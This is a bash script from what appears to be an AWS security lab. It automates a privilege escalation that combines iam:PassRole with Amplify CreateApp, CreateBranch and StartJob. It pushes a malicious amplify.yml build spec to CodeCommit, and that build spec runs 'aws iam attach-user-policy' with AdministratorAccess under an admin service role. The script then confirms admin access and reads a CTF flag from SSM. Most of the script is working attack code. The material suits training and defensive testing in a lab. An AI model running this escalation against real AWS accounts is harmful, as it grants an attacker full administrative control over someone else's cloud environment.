#!/bin/bash
set -e

# Demo script for iam:PassRole + amplify:CreateApp + amplify:CreateBranch + amplify:StartJob privilege escalation
# This scenario demonstrates how a user with PassRole and Amplify permissions can escalate
# by creating a CodeCommit repo with a malicious amplify.yml, then creating an Amplify app
# that uses an admin service role to execute build commands with elevated privileges.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-amplify-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-amplify-001-to-admin-admin-role"
APP_NAME="pl-prod-amplify-001-to-admin-app"
REPO_NAME="pl-prod-amplify-001-to-admin-repo"
CLONE_DIR="/tmp/amplify-001-exploit-repo"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + Amplify CreateApp + CreateBranch + StartJob Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_amplify_001_iam_passrole_amplify_createapp_amplify_createbranch_amplify_startjob.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
CODECOMMIT_CLONE_URL=$(echo "$MODULE_OUTPUT" | jq -r '.codecommit_repo_clone_url_http')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "CodeCommit Repo URL: $CODECOMMIT_CLONE_URL"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_REGION=$AWS_REGION
use_starting_creds

echo "Using region: $AWS_REGION"

# [EXPLOIT] Verify starting user identity
use_starting_creds
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
use_starting_creds
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Clone CodeCommit repo and push malicious amplify.yml
use_starting_creds
echo -e "${YELLOW}Step 5: Cloning CodeCommit repository and pushing malicious build spec${NC}"
echo "Repository: $REPO_NAME"
echo "Clone URL: $CODECOMMIT_CLONE_URL"

# Clean up any previous clone
rm -rf "$CLONE_DIR"

# Git credential-helper config for CodeCommit.
#
# Pitfall: setting `credential.helper` via `git config --global` does NOT replace
# system-level helpers (e.g. macOS `osxkeychain`, Linux libsecret) — git chains
# them. The keychain runs first, returns stale/empty creds, and git never falls
# through to the AWS helper, producing an opaque HTTP 403 from CodeCommit.
#
# Fix: pass an empty `credential.helper=` via `-c` before the codecommit one on
# every git invocation. The empty value resets the helper chain for that command,
# so only the codecommit helper runs. We use `-c` (not `git config --global`) so
# the user's global gitconfig is never touched.
GIT_CC_FLAGS=(
    -c "credential.helper="
    -c "credential.helper=!aws codecommit credential-helper \$@"
    -c "credential.UseHttpPath=true"
)

echo "Configured per-invocation git credential helper for CodeCommit"

# Clone the repository (with retry for IAM propagation lag — a fresh terraform apply
# can take 20-60s before CodeCommit honors the GitPull policy on the starting user)
echo "Cloning repository..."
show_cmd "Attacker" "git clone $CODECOMMIT_CLONE_URL $CLONE_DIR"
CLONE_ATTEMPTS=0
MAX_CLONE_ATTEMPTS=4
CLONE_OK=0
while [ $CLONE_ATTEMPTS -lt $MAX_CLONE_ATTEMPTS ]; do
    rm -rf "$CLONE_DIR"
    if git "${GIT_CC_FLAGS[@]}" clone "$CODECOMMIT_CLONE_URL" "$CLONE_DIR" 2>&1; then
        CLONE_OK=1
        break
    fi
    CLONE_ATTEMPTS=$((CLONE_ATTEMPTS + 1))
    if [ $CLONE_ATTEMPTS -lt $MAX_CLONE_ATTEMPTS ]; then
        echo "  Clone attempt $CLONE_ATTEMPTS/$MAX_CLONE_ATTEMPTS failed, sleeping 10s and retrying..."
        sleep 10
    fi
done
if [ $CLONE_OK -ne 1 ]; then
    echo -e "${RED}Error: Failed to clone CodeCommit repository${NC}"
    exit 1
fi

cd "$CLONE_DIR"

# Create the malicious amplify.yml build spec
# The Amplify build environment has full AWS SDK access using the service role's credentials.
# Build commands can directly call IAM APIs to attach AdministratorAccess to the starting user.
echo "Creating malicious amplify.yml build spec..."
cat > amplify.yml << BUILDSPECEOF
version: 1
frontend:
  phases:
    preBuild:
      commands:
        - echo "Exploiting admin role credentials..."
        - aws sts get-caller-identity
        - aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
        - echo "Privilege escalation complete"
    build:
      commands:
        - echo "Build phase"
  artifacts:
    baseDirectory: /
    files:
      - '**/*'
BUILDSPECEOF

# Create a minimal index.html so Amplify has something to build
cat > index.html << 'HTMLEOF'
<!DOCTYPE html>
<html><head><title>Amplify Demo</title></head>
<body><h1>Amplify Privilege Escalation Demo</h1></body></html>
HTMLEOF

# Commit and push (push needs the same credential-helper override as clone).
# Tolerate "nothing to commit" — a prior partial demo run may have already pushed
# the same amplify.yml/index.html, in which case the working tree is clean and the
# malicious build spec is already in the remote main branch. Either way, push so
# we're sure remote is up to date.
git add -A
if git -c user.email="demo@pathfinding.labs" -c user.name="Demo User" \
       commit -m "Add malicious amplify.yml build spec" 2>&1; then
    echo "Created new commit with malicious build spec"
else
    echo "Working tree clean — malicious build spec already present from prior run"
fi
echo "Pushing malicious build spec to CodeCommit..."
show_cmd "Attacker" "git push -u origin HEAD:main"
git "${GIT_CC_FLAGS[@]}" push -u origin HEAD:main 2>&1 || true

echo -e "${GREEN}✓ Malicious amplify.yml pushed to CodeCommit repository${NC}\n"

# Return to scenario directory (per-invocation `-c` flags mean no global config to restore)
cd - > /dev/null

# [EXPLOIT] Step 6: Create Amplify app with admin service role (PassRole)
use_starting_creds
echo -e "${YELLOW}Step 6: Creating Amplify app with admin service role${NC}"
echo "This is the PassRole step - passing the admin role as the Amplify service role."
echo "App name: $APP_NAME"
echo "Repository: $CODECOMMIT_CLONE_URL"
echo "Service role: $ADMIN_ROLE_ARN"

# Pitfall: passing --repository directly triggers an AWS CLI v2 client-side preflight
# (HTTP GET against the repo URL) that ignores the codecommit credential-helper and
# returns 401, blocking the request before it reaches Amplify. Workaround: pass the
# parameters via --cli-input-json which skips the preflight URL probe.
CREATE_APP_INPUT=$(jq -nc \
    --arg name "$APP_NAME" \
    --arg repo "$CODECOMMIT_CLONE_URL" \
    --arg role "$ADMIN_ROLE_ARN" \
    '{name: $name, repository: $repo, iamServiceRoleArn: $role}')
show_attack_cmd "Attacker" "aws amplify create-app --cli-input-json '$CREATE_APP_INPUT' --region $AWS_REGION --output json"
APP_RESULT=$(aws amplify create-app \
    --cli-input-json "$CREATE_APP_INPUT" \
    --region "$AWS_REGION" \
    --output json)

APP_ID=$(echo "$APP_RESULT" | jq -r '.app.appId')
if [ -z "$APP_ID" ] || [ "$APP_ID" = "null" ]; then
    echo -e "${RED}Error: Failed to create Amplify app${NC}"
    exit 1
fi

echo "Amplify App ID: $APP_ID"
echo -e "${GREEN}✓ Amplify app created with admin service role${NC}\n"

# [EXPLOIT] Step 7: Create branch for the app
use_starting_creds
echo -e "${YELLOW}Step 7: Creating branch for Amplify app${NC}"
echo "Branch: main"

show_attack_cmd "Attacker" "aws amplify create-branch --app-id $APP_ID --branch-name main --region $AWS_REGION --output json"
aws amplify create-branch \
    --app-id "$APP_ID" \
    --branch-name main \
    --region "$AWS_REGION" \
    --output json > /dev/null

echo -e "${GREEN}✓ Branch 'main' created${NC}\n"

# [EXPLOIT] Step 8: Start build job
use_starting_creds
echo -e "${YELLOW}Step 8: Starting Amplify build job${NC}"
echo "This triggers the build which executes the malicious amplify.yml commands"
echo "using the admin service role's credentials."

show_attack_cmd "Attacker" "aws amplify start-job --app-id $APP_ID --branch-name main --job-type RELEASE --region $AWS_REGION --output json"
JOB_RESULT=$(aws amplify start-job \
    --app-id "$APP_ID" \
    --branch-name main \
    --job-type RELEASE \
    --region "$AWS_REGION" \
    --output json)

JOB_ID=$(echo "$JOB_RESULT" | jq -r '.jobSummary.jobId')
if [ -z "$JOB_ID" ] || [ "$JOB_ID" = "null" ]; then
    echo -e "${RED}Error: Failed to start build job${NC}"
    exit 1
fi

echo "Job ID: $JOB_ID"
echo -e "${GREEN}✓ Build job started${NC}\n"

# [OBSERVATION] Step 9: Poll job status until completion
use_readonly_creds
echo -e "${YELLOW}Step 9: Waiting for build job to complete${NC}"
echo "The build typically takes 2-5 minutes..."
echo "Polling every 15 seconds (10 minute timeout)..."
echo ""

MAX_WAIT=600
ELAPSED=0
while [ $ELAPSED -lt $MAX_WAIT ]; do
    MINUTES_ELAPSED=$((ELAPSED / 60))
    SECONDS_REMAINING=$((ELAPSED % 60))

    show_cmd "ReadOnly" "aws amplify get-job --app-id $APP_ID --branch-name main --job-id $JOB_ID --region $AWS_REGION --query 'job.summary.status' --output text"
    JOB_STATUS=$(aws amplify get-job \
        --app-id "$APP_ID" \
        --branch-name main \
        --job-id "$JOB_ID" \
        --region "$AWS_REGION" \
        --query 'job.summary.status' \
        --output text)

    echo "[${MINUTES_ELAPSED}m ${SECONDS_REMAINING}s] Job status: $JOB_STATUS"

    if [ "$JOB_STATUS" == "SUCCEED" ]; then
        echo -e "${GREEN}✓ Build job completed successfully!${NC}\n"
        break
    fi

    if [ "$JOB_STATUS" == "FAILED" ] || [ "$JOB_STATUS" == "CANCELLED" ]; then
        echo -e "${YELLOW}Build job status: $JOB_STATUS${NC}"
        echo "Note: The build may fail in later phases (deploy) but the preBuild commands"
        echo "that attach AdministratorAccess may have already executed successfully."
        echo "Checking if privilege escalation succeeded anyway..."
        echo ""
        break
    fi

    sleep 15
    ELAPSED=$((ELAPSED + 15))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for build job to complete (10 minutes)${NC}"
    echo "Job may still be running. Check the Amplify console."
    echo "Checking if privilege escalation succeeded anyway..."
    echo ""
fi

# [OBSERVATION] Step 10: Verify privilege escalation
use_readonly_creds
echo -e "${YELLOW}Step 10: Verifying privilege escalation${NC}"

# Wait for IAM propagation
echo "Waiting 15 seconds for IAM policy to propagate..."
sleep 15

# Check if AdministratorAccess was attached
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output json"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --output json)

ADMIN_ATTACHED=$(echo "$ATTACHED_POLICIES" | jq -r '.AttachedPolicies[] | select(.PolicyArn == "arn:aws:iam::aws:policy/AdministratorAccess") | .PolicyName')

if [ -z "$ADMIN_ATTACHED" ]; then
    echo -e "${RED}Error: AdministratorAccess not found on starting user${NC}"
    echo "The build commands may not have executed successfully."
    echo "Check the Amplify build logs in the AWS console."
    rm -rf "$CLONE_DIR"
    exit 1
fi

echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
echo ""

# [OBSERVATION] Prove admin access by listing IAM users
use_readonly_creds
echo "Attempting to list IAM users..."
show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    rm -rf "$CLONE_DIR"
    exit 1
fi
echo ""

# Clean up temporary files
rm -rf "$CLONE_DIR"

# [EXPLOIT]
# Step 11: Capture the CTF flag
# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
use_starting_creds
echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/amplify-001-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, amplify:CreateApp, amplify:CreateBranch, amplify:StartJob)"
echo "2. Cloned CodeCommit repo and pushed malicious amplify.yml with admin IAM commands"
echo "3. Created Amplify app connected to repo, passing admin role via iam:PassRole"
echo "4. Created branch and started build job"
echo "5. Amplify build executed with admin role credentials, attached AdministratorAccess to starting user"
echo "6. Achieved: Administrator Access"
echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (git push malicious amplify.yml to CodeCommit)"
echo "  → (iam:PassRole + amplify:CreateApp) → App with $ADMIN_ROLE_NAME"
echo "  → (amplify:CreateBranch + amplify:StartJob) → Build executes as admin"
echo "  → (iam:AttachUserPolicy in build) → Admin"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Amplify App: $APP_NAME (ID: $APP_ID)"
echo "- Amplify Branch: main"
echo "- Build Job: $JOB_ID"
echo "- AdministratorAccess policy attached to $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The Amplify app is still deployed${NC}"
echo -e "${RED}⚠ AdministratorAccess is still attached to $STARTING_USER${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
